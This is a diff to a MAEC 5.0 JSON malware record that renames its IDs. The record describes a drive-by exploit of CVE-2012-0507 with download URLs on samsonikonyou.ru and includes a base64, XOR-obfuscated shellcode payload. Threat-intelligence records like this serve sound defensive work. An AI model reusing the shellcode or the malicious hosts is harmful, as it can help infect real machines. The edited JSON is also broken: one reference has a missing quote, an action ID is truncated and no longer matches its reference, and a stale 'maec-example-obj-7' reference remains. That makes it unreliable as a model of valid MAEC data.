@@ -3,57 +3,60 @@
 	"schema_version":"5.0",
 	"malware_instances":[
 		{
-			"id":"maec-example-instance-1",
-			"instance_object_ref":"instance-obj-1",
+			"id":"malware_instance--82008585-1939-4ca8-bd47-3173c1e91053",
+			"instance_object_ref":"object--1",
 			"capability_refs":[
-				"maec-tst-cpb-1"
+				"capability--32225dea-ea58-4af8-911a-7a9c04cc19cf"
 			],
 			"behavior_refs":[
-				"maec-example-bhv-1",
-				"maec-example-bhv-2"
+				"behavior--738f7800-58f0-45d5-9f69-0fdb10050edc",
+				"behavior--4efd2828-92b8-41df-862e-9d983fe0d2f3"
+			],
+			"object_refs":[
+				"object--8"
 			],
 			"action_refs":[
-				"maec-example-act-1",
-				"maec-example-act-2",
-				"maec-example-act-3"
+				"action--f0e023b8-6789-4425-bfbe-2c80ae50c81d",
+				"action--26462916-6cf6-4d60-908f-18bb96232463",
+				"action--63890287-23c6-42a6-8aa2-5d27e79c86dd"
 			]
 		}
 	],
 	"cybox":{
 		"objects":{
-			"instance-obj-1":{
+			"object--1":{
 				"type":"url",
 				"value":"http://samsonikonyou.ru:8080/navigator/jueoaritjuir.php"
 			},
-			"maec-example-obj-1":{
+			"object--2":{
 				"type":"file",
 				"file_name":"xodmeqglxldnx.jar"
 			},
-			"maec-example-obj-2":{
+			"object--3":{
 				"type":"url",
 				"value": "http://samsonikonyou.ru:8080/navigator/xodmeqglxldnx.jar"
 			},
-			"maec-example-obj-3":{
+			"object--4":{
 				"type":"file",
 				"file_name":"krgobpevcpync.jar"
 			},
-			"maec-example-obj-4":{
+			"object--5":{
 				"type":"url",
 				"file_name":"http://samsonikonyou.ru:8080/navigator/krgobpevcpync.jar"
 			},
-			"maec-example-obj-5":{
+			"object--7":{
 				"type":"file",
 				"file_name":"aqcphscwgqhvkzy5.pdf",
 				"contains_refs":[
 					"maec-example-obj-7"
 				]
 			},
-			"maec-example-obj-7":{
+			"object--8":{
 				"type":"artifact",
 				"description":"Purpose: Shellcode, Code Language: Assembly, xor_pattern=55AA55AA55AA55BB",
 				"payload_bin":"did7Q+eH3R9n67he0QGpKaTkiouTnrJnL0BwGOhfMtaxBxwZYl3lGOdRQA2lo5N9YYZSQLQNwNm/2VAMaqGtFmFPZzi/IjNep6jJOAa/Zob04PSUBG7I6ouWgunaARUAw5bX/4iwEOohY7dtp2iPD5u70CDrHil+GieKzKoEKlmBlKOKNBwZZaHTfau31rQxsrJA3kPdUveiBDiG/VzCgKB6/Z+sn8QAyqU1e+47DqdlQJYikWIOi8s19yB2HSeFXvam7F+vp/5RPajP1XMevsqsjZvBe7u+BBDqniiunMr9UogAj4U6vyS9AmYSPOozqLgv2YHPimKuWJkAkrUzG/ifG05zlJgnaoGKllReXMzOC+7+Ee44WtjgCFdu1xgcC6PGnHDiYuCPsfiuck+HJkeE/vZbYmZu0UlTHWD5DLpzSCK04YeRvcwxr+wlwE1JfgrGVsIRsirwhQwoe/9n6t401WemVdDcJBgbfgaBj4MU2Kj5SpXexfw2oTh7kH7xfVFqFgSgEuk5L9wzjjZxvh4dYqaPxRDbtOSeth3/5MoG7eBzCMPIl45uzpkCejHxcBJPT2ibVGQJPBHSqGi351USXOjDIUQyIgB/t4LcD3MBGC2GhXJXUjwf8BG1zfljX5BFWaV5MgKiiTrQP36YcvVYaqAq/Eh1EhCnRNnhTgtW5HPwLR1LFLn8IBywt+uW08jU8a6xieI3sgLN0NJYRnU4PNj1b6TR7l10veu1BZZkSEbj3FmJ4/jmtDGdH1t8ldJ3LqKOGgIXlpeyySA/PmjWRFXfPCUX1RUeXsLaE9X4Iqwd+kBxMMxDec5oT+HRZm0Bfh9Ui2HdI1GpSGEhcRHAoodVxibihtiT5bbuXhJ6RnivnbBbItlBFi9jQjSQsgD/Q2xNyQ/QbuVdxZ26XQbxeNrlJmA4ZyHiKYGHuNc5CdLF0iuLA2aRE3X2E/6iW7eZUZCfUie/wFn2iU3HVsdcJtL8aVtA2G9f8UwYCd29oLz7hvz89I29o7FXBjsSNeAvImz6D3IJ1Sc1aPxmwVYJuJ5DBoUMikdM1cudb68whXi/fI8Vk3gblXGKjgSxhGz8GmDYGfNLjf976FtZxsQ2P7yBxCc1pWGvTctsPmkxqi4ytqjBp5YuANqvxarRojXykr8vrErl7gCPyG1eNPiqhX5oN3hsYgKU8NA7Cy6WMVXCjMU3IspYY7McR4jzcSi0X0oTOMSsnRtuOvXVQE2Zysy0Q3JQ4OBOmxj8YcZChwOr1FyXsxwYIFYAyA9pZoxVE1Z4MgKWaXlV+yewgdlk/9WfxVDbrxmQml/rMGBmUczBNuIJmIGVFczK/uiEtmbdxKI6N07hUGJICKXix09PcfCEkuGu3IVuFlcQ+1DOplNDIru0fmv/ugZdrY7oohbV9ATfD3w="
 			},
-			"maec-example-obj-6":{
+			"object--6":{
 				"type":"url",
 				"value":"http://samsonikonyou.ru:8080/navigator/aqcphscwgqhvkzy5.pdf"
 			}
@@ -61,11 +64,10 @@
 	},
 	"capabilities":[
 		{
-			"id":"maec-tst-cpb-1",
+			"id":"capability--32225dea-ea58-4af8-911a-7a9c04cc19cf",
 			"name":"infection/propagation",
 			"refined_capabilities":[
 				{
-					"id":"maec-tst-obt-1",
 					"name":"remote machine infection"
 				}
 			]
@@ -73,7 +75,7 @@
 	],
 	"behaviors":[
 		{
-			"id":"maec-example-bhv-1",
+			"id":"behavior--738f7800-58f0-45d5-9f69-0fdb10050edc",
 			"description":"A vulnerability exploit behavior initiated by some code on the web page.",
 			"attributes":[
 				{
@@ -83,11 +85,11 @@
 			]
 		},
 		{
-			"id":"maec-example-bhv-2",
+			"id":"behavior--4efd2828-92b8-41df-862e-9d983fe0d2f3",
 			"description":"A vulnerability exploit behavior initiated by some code on the web page.",
 			"attributes":[
 				{
-					"name": "ulnerability ID (CVE)",
+					"name": "vulnerability ID (CVE)",
 					"value":"CVE-2012-0507"
 				}
 			]
@@ -96,43 +98,43 @@
 	],
 	"actions":[
 		{
-			"id":"maec-example-act-1",
+			"id":"action--f0e023b8-6789-4425-bfbe-2c80ae50c81d",
 			"name":"download file",
 			"object_references":[
 				{
-					"obj_ref":"maec-example-obj-1",
+					"obj_ref":"object--1",
 					"association_type":"output"
 				},
 				{
-					"obj_ref":"maec-example-obj-2",
+					"obj_ref":"object--3",
 					"association_type":"input"
 				}
 			]
 		},
 		{
-			"id":"maec-example-act-2",
+			"id":"action--26462916-6cf6-4d60-908f-18bb9623246",
 			"name":"download file",
 			"object_references":[
 				{
-					"obj_ref":"maec-example-obj-3",
+					"obj_ref":"object--4",
 					"association_type":"output"
 				},
 				{
-					"obj_ref":"maec-example-obj-4",
+					"obj_ref":"object--5,
 					"association_type":"input"
 				}
 			]
 		},
 		{
-			"id":"maec-example-act-3",
+			"id":"action--63890287-23c6-42a6-8aa2-5d27e79c86dd",
 			"name":"download file",
 			"object_references":[
 				{
-					"obj_ref":"maec-example-obj-5",
+					"obj_ref":"object--6",
 					"association_type":"output"
 				},
 				{
-					"obj_ref":"maec-example-obj-6",
+					"obj_ref":"object--7",
 					"association_type":"input"
 				}
 			]
